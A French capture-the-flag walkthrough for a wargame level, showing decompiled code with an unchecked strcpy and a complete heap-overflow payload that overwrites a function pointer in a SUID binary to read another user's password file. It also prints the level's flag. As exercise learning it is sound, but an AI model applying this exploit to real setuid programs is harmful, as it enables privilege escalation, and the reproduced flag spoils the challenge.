# Level6 - Walkthrough

## Objectif
Exploiter un heap buffer overflow pour écraser un pointeur de fonction et exécuter `n()` qui affiche le flag.

**Technique** : Heap Overflow + Function Pointer Overwrite

---

## Étapes d'exploitation

### 1. Reconnaissance
```bash
ls -la
# -rwsr-s---+ 1 level7 users  5274 Mar  6  2016 level6
# ⚠️ Bit SUID actif → s'exécute avec les droits de level7

./level6
# Segmentation fault

./level6 test
# Nope
```

### 2. Analyse du code (Ghidra)

```c
void m(void) { puts("Nope"); }

void n(void) { system("/bin/cat /home/user/level7/.pass"); }

int main(int argc, char **argv) {
    char *dest     = malloc(64);  // Bloc 1
    void (*func_ptr)(void) = malloc(4);   // Bloc 2 (adjacent !)

    *func_ptr = m;           // func_ptr pointe vers m()
    strcpy(dest, argv[1]);   // ⚠️ Pas de vérification de taille !
    (*func_ptr)();           // Appelle la fonction pointée
}
```

**Stratégie** : Overflow `dest` pour écraser `func_ptr` avec l'adresse de `n()`.

### 3. Trouver l'adresse de `n()`

```bash
# Dans Ghidra → cliquer sur n()
# Adresse : 0x08048454

# Ou avec objdump :
objdump -t level6 | grep " n$"
# 08048454 g     F .text  n
```

### 4. Déterminer l'offset

#### Pattern cyclique
```bash
gdb level6
(gdb) run $(python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac"')

Program received signal SIGSEGV
(gdb) info registers eip
# eip = 0x63413663 → chercher dans le pattern → position 72
```

#### Vérification
```bash
(gdb) run $(python -c 'print "A"*72 + "BBBB"')
(gdb) info registers eip
# eip = 0x42424242 → "BBBB" ✅
```

**Offset = 72 bytes** (64 buffer + 8 header malloc)

### 5. Construction du payload

**Conversion de l'adresse en little-endian** :
```
0x08048454 → \x54\x84\x04\x08
```

**Structure** :
```
['A' × 72] + [adresse de n()]
     ↓               ↓
  Remplit dest    Écrase func_ptr
  + header malloc
```

### 6. Exploitation

```bash
./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
```

**Résultat** : Le flag s'affiche directement.

---

## Flag
```
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

## Type de vulnérabilité
- Heap-based Buffer Overflow (CWE-122)
- Function Pointer Overwrite
- SUID privilege escalation (CWE-250)